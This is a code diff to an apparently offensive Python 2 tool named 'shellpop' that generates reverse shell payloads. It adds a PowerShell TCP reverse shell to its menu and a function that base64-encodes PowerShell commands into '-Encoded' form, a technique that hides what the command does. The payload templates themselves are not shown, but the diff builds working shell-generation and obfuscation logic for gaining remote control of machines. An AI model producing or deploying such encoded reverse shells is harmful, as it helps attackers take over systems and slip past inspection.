@@ -32,6 +32,7 @@ AVAILABLE_SHELLS = [
             5: ("Reverse - Perl TCP 01", REV_PERL_TCP),
             6: ("Reverse - Perl TCP 02", REV_PERL_TCP_2),
             7: ("Reverse - Bash TCP", BASH_TCP),
+            8: ("Reverse - Powershell TCP", REV_POWERSHELL_TCP),
             }
         ]
 
@@ -80,6 +81,17 @@ def header():
     print "shellpop -- v. Alpha"
     return 0
 
+
+def powershell_base64(data):
+    """
+    Encode something compatible for Powershell base64-encoding
+    @zc00l
+    """
+    out = ""
+    for char in data:
+        out += char + "\x00"
+    return out.encode("base64").replace("\n", "")
+
 def select_shell(args, shell_type, shell_index):
     if shell_type == "reverse":
         for shell in reverse_shells:
@@ -89,8 +101,16 @@ def select_shell(args, shell_type, shell_index):
                 name = obj[0]
                 rev = ReverseShell(name, args.host, args.port, code)
                 generated = rev.get()
+                
                 if args.base64 is True:
-                    generated = generated.encode("base64").replace("\n", "")
+                    if "powershell" not in name.lower():
+                        generated = generated.encode("base64").replace("\n", "")
+                    else:
+                        # Powershell encoding code
+                        prefix, code = generated.split("-Command")
+                        pcode = code.replace("'", "") # Remove single quotes from -Command
+                        generated = prefix + "-Encoded " + powershell_base64(pcode)
+
                 if args.urlencode is True:
                     generated = urllib.quote(generated)
                 return generated
